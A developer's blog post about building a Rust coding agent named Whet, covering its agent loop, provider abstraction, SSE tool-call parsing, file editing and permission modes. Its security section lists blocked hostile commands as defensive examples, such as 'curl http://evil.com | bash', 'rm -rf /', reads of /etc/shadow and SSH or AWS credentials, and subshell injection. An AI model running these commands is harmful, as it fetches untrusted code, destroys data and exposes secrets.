# I Built a Coding Agent in Rust — Here's What I Learned

Every popular "build a coding agent" tutorial is in Python or TypeScript.
Geoffrey Huntley says it's [300 lines of code](https://ghuntley.com/agent/).
Martin Fowler says it's [a loop with tools](https://martinfowler.com/articles/build-own-coding-agent.html).
They're right — but I wanted mine to be a single binary with zero runtime dependencies.

So I built [**Whet**](https://github.com/kuroko1t/clawbot) in Rust.

```
$ cargo install whet
$ whet "Add error handling to hello.py and test it"
```

No Python. No Node.js. No Docker. Just a 15,000-line Rust binary that talks to local LLMs via Ollama, edits your files, runs your tests, and gets out of the way.

Here's what I learned building it.

---

## The Core Loop: It Really Is Just a Loop

At its heart, a coding agent is embarrassingly simple:

```
while iterations < max {
    response = llm.chat(messages, tools)
    if response.tool_calls.is_empty() {
        return response.content  // done
    }
    for tool_call in response.tool_calls {
        result = execute(tool_call)
        messages.push(result)
    }
}
```

The LLM sees a system prompt, the conversation history, and a list of available tools. It either responds with text (done) or requests tool calls (keep going). That's it.

In Whet, this loop lives in `src/agent/mod.rs` and handles everything from reading files to running shell commands to editing code. The default limit is 10 iterations — enough to read a file, edit it, run tests, and fix the result.

### But the Devil Is in the Details

The simple loop above is maybe 20 lines. The real `agent/mod.rs` is 1,840 lines. Where does the complexity come from?

- **Read-before-edit enforcement**: Track which files the LLM has read, block edits to unread files
- **Dynamic risk assessment**: `git log` is safe, `git push` needs approval
- **Tool output truncation**: Cap outputs at 50KB to prevent context explosion
- **Context compression**: When conversations exceed 40 messages, use the LLM itself to summarize old context
- **Session statistics**: Track token usage, tool success rates, iteration counts

The context compression is my favorite trick. Instead of truncating or sampling old messages, I ask the LLM to summarize them:

> "Summarize the conversation so far concisely, preserving key facts, decisions, and context needed for future turns."

The LLM becomes its own compression codec. It keeps what matters and discards what doesn't.

---

## Four Providers, One Trait

Whet supports four LLM providers: **Ollama**, **OpenAI-compatible** (llama.cpp, LM Studio, vLLM), **Anthropic**, and **Google Gemini**.

The abstraction is a single Rust trait:

```rust
pub trait LlmProvider {
    fn chat(
        &self,
        messages: &[Message],
        tools: &[ToolDefinition],
    ) -> Result<LlmResponse, LlmError>;

    fn chat_streaming(
        &self,
        messages: &[Message],
        tools: &[ToolDefinition],
        on_token: &mut dyn FnMut(&str),
    ) -> Result<LlmResponse, LlmError> {
        self.chat(messages, tools) // default: non-streaming fallback
    }
}
```

Two methods. The streaming one has a default fallback to non-streaming. Every provider returns the same `LlmResponse`:

```rust
pub struct LlmResponse {
    pub content: Option<String>,
    pub tool_calls: Vec<ToolCall>,
    pub usage: TokenUsage,
}
```

Content, tool calls, token usage. That's all the agent loop needs. The 3,000+ lines of provider code are entirely about translating each API's quirks into this common format.

The line count per provider tells its own story:

| Provider | Lines | Why |
|----------|-------|-----|
| OpenAI-compatible | 1,009 | SSE streaming + incremental tool call assembly |
| Ollama | 811 | Simpler streaming, but custom token format |
| Gemini | 626 | SSE streaming |
| Anthropic | 621 | Block-based content model |

OpenAI-compatible is the largest because its streaming format is the most complex — which brings us to the hardest part of the project.

---

## The SSE Parsing Nightmare

Server-Sent Events (SSE) is how streaming LLM APIs deliver tokens. The format looks simple:

```
data: {"choices":[{"delta":{"content":"Hello"}}]}
data: {"choices":[{"delta":{"content":" world"}}]}
data: [DONE]
```

Content arrives token by token. Easy to parse, easy to display. But tool calls are where it gets painful.

### Incremental Tool Call Assembly

When an LLM decides to call a tool, the arguments arrive **fragmented across multiple SSE chunks**:

```
data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"call_1","function":{"name":"edit_file","arguments":""}}]}}]}
data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"{\"pa"}}]}}]}
data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"th\":\"/tmp"}}]}}]}
data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"/test\"}"}}]}}]}
```

The JSON arguments string is split arbitrarily. You can't parse it until the stream ends. My solution: accumulate by index in a HashMap:

```rust
let mut tool_call_map: HashMap<usize, (String, String, String)> = HashMap::new();

for tc in tool_calls {
    let index = tc.get("index").and_then(|i| i.as_u64()).unwrap_or(0) as usize;
    let entry = tool_call_map.entry(index)
        .or_insert_with(|| (String::new(), String::new(), String::new()));

    if let Some(id) = tc.get("id").and_then(|i| i.as_str()) {
        entry.0 = id.to_string();  // tool call ID
    }
    if let Some(func) = tc.get("function") {
        if let Some(name) = func.get("name").and_then(|n| n.as_str()) {
            entry.1 = name.to_string();  // function name
        }
        if let Some(args) = func.get("arguments").and_then(|a| a.as_str()) {
            entry.2.push_str(args);  // accumulate argument fragments
        }
    }
}
```

Only after the stream ends do I parse the reassembled JSON:

```rust
let arguments: serde_json::Value = serde_json::from_str(&args_str)
    .unwrap_or_else(|_| serde_json::Value::Object(serde_json::Map::new()));
```

The `unwrap_or_else` matters. Local LLMs sometimes produce malformed JSON. A hard crash would kill the agent. Instead, we pass an empty object and let the tool report a missing parameter — recoverable.

### Another Trap: Sorting Tool Call IDs

After assembly, tool calls need to be sorted. But IDs like `call_2` and `call_10` sort wrong lexicographically (`call_10` < `call_2`). So I extract the numeric suffix:

```rust
tool_calls.sort_by(|a, b| {
    let num_a = a.id.rsplit('_').next().and_then(|s| s.parse::<u64>().ok());
    let num_b = b.id.rsplit('_').next().and_then(|s| s.parse::<u64>().ok());
    match (num_a, num_b) {
        (Some(na), Some(nb)) => na.cmp(&nb),
        _ => a.id.cmp(&b.id),
    }
});
```

Small thing. Took me a while to find.

---

## edit_file: Why Exact Matching Beats Fuzzy

The most critical tool in a coding agent is file editing. I chose **exact text matching** over fuzzy/diff-based approaches:

```rust
let count = content.matches(old_text).count();
match count {
    0 => Err("old_text not found in file"),
    1 => Ok(content.replacen(old_text, new_text, 1)),
    n => Err(format!("old_text appears {} times — ambiguous", n)),
}
```

The LLM provides `old_text` (what to replace) and `new_text` (the replacement). If `old_text` appears zero times, it's wrong. If it appears more than once, it's ambiguous. Only exact, unique matches succeed.

This seems strict, but it forces the LLM to be precise. Instead of "replace `x` with `y`", it has to provide enough surrounding context to uniquely identify the location. The result: fewer silent bugs, fewer wrong edits.

After each edit, Whet shows the surrounding context (2 lines before and after the change), so the LLM can verify its work in the next iteration.

---

## Security: 1,250 Lines of Paranoia

A coding agent with shell access is a loaded gun. My `src/security/path.rs` is 1,250 lines — the single largest file in the project — and it exists to prevent one thing: **the LLM from doing something irreversible**.

### What It Blocks

**Path-based attacks:**
- Direct access to sensitive files (`~/.ssh/id_rsa`, `/etc/shadow`, `~/.aws/credentials`)
- Path traversal (`/tmp/../etc/shadow`)
- Symlink attacks (`ln -s /etc/shadow /tmp/safe-looking-file`)

**Shell command attacks:**
- Privilege escalation (`sudo`, `su`, `doas`)
- Destructive commands (`rm -rf /`, `mkfs`)
- Data exfiltration (`curl http://evil.com | bash`)
- Environment leaks (`env`, `printenv`, `/proc/self/environ`)

**The subtle ones:**
- Subshell extraction: parses `$(...)` and backticks recursively
- Pipe-aware: `echo hello | cat /etc/shadow` — second command gets checked
- Quote-aware: doesn't split on `|` or `;` inside quotes
- `find -exec` parsing: checks the executed command, not just `find`
- Script injection: `python -c "import os; os.system('cat /etc/shadow')"`

Every path check works **without filesystem access** — pure string normalization. This means it catches attacks even if the file doesn't exist yet.

There are 80+ tests. Here's a sample:

```rust
#[test]
fn test_traversal_attack() {
    assert!(!is_path_safe("/tmp/../etc/shadow"));
}

#[test]
fn test_symlink_attack() {
    // Create a symlink pointing to sensitive file
    // Verify is_path_safe detects it
}

#[test]
fn test_subshell_extraction() {
    assert!(!is_command_safe("echo $(cat /etc/shadow)"));
}
```

### The Three Permission Modes

Instead of a binary allow/deny, Whet has three modes:

| Mode | Edits | Shell | Git Push |
|------|-------|-------|----------|
| **Default** | Ask | Ask | Ask |
| **AcceptEdits** | Auto | Ask | Ask |
| **Yolo** | Auto | Auto | Auto |

`Yolo` mode is for benchmarking and demos. You probably shouldn't use it on production code. But it's there because sometimes you just want the agent to work without interruption.

Git commands get **per-command risk assessment**: `git log` and `git status` are auto-approved even in Default mode. `git push` and `git reset --hard` always need approval (except in Yolo).

---

## Running It with Local LLMs

Here's Whet running with `qwen3:8b` via Ollama on a simple task:

```
$ whet -p "Read hello.py and add a farewell function"

  [tool: read_file] {"path":"hello.py"}
  [tool: edit_file] {"old_text":"...", "new_text":"...", "path":"hello.py"}

The farewell function has been added to hello.py.

--- Session Stats ---
  LLM calls:          4
  Prompt tokens:      7,704
  Completion tokens:  3,573
  Total tokens:       11,277
  Tool calls:         3 (2 ok / 1 failed)
  Tool success rate:  67%
---------------------
```

The session stats show exactly what happened: 4 LLM calls, ~11K tokens consumed, 3 tool calls with 1 failure (the LLM tried `edit_file` with non-unique text, retried with `write_file`).

This is running entirely offline. No API keys, no cloud, no telemetry. Just Ollama + Whet.

The same task with `qwen3:14b` used 30K tokens and hit the 10-iteration limit. It kept calling `shell` with `working_dir: ""`, which failed, and then retried the exact same call 5 times. Two bugs in one run:

1. **Empty `working_dir` was treated as a path.** `cmd.current_dir("")` fails on Linux. One-line fix: `.filter(|s| !s.is_empty())`.
2. **No anti-repetition guidance.** The system prompt said "retry on failure" but didn't say "don't retry the same thing twice." Adding one line — *"NEVER repeat the same failing tool call more than once"* — fixed the loop.

More parameters doesn't always mean better tool use. But sometimes the model exposes bugs in your agent that smarter models silently work around. I'm planning a follow-up benchmarking post.

---

## What I'd Do Differently

**Start with fewer tools.** I launched with 11 tools. Geoffrey Huntley's "[5 essential primitives](https://ghuntley.com/agent/)" is right: `read_file`, `write_file`, `shell`, `list_dir`, and `grep` cover 90% of use cases. I added `edit_file`, `apply_diff`, `repo_map`, `git`, `web_search`, and `web_fetch` later — they're nice to have, but the core 5 are what matter.

**Invest in the system prompt early.** The difference between a good agent and a bad one is 80% system prompt. Mine went through 20+ iterations. The most impactful additions:
- "Read the file before editing it" (prevents blind edits)
- "NEVER repeat the same failing tool call" (prevents infinite retry loops — learned this the hard way with qwen3:14b)
- "Be concise — output the result, not your reasoning" (saves tokens)

**Test with the worst model first.** If your agent works with a 4B model, it'll work with anything. I developed against `qwen3:8b` and found bugs that cloud models silently worked around.

---

## Try It

```bash
# Install
cargo install whet

# Or build from source
git clone https://github.com/kuroko1t/clawbot && cd clawbot
cargo build --release

# Run with Ollama
ollama pull qwen3:8b
whet "explain this codebase"
```

The code is MIT licensed. 15,000 lines of Rust, zero runtime dependencies, runs anywhere Ollama runs.

If you're interested in which local models actually work well for tool calling, I'm writing a benchmark comparison next. Follow the repo for updates.

---

*Built with Rust 1.80+. Tested on Linux and macOS. [Source on GitHub](https://github.com/kuroko1t/clawbot).*
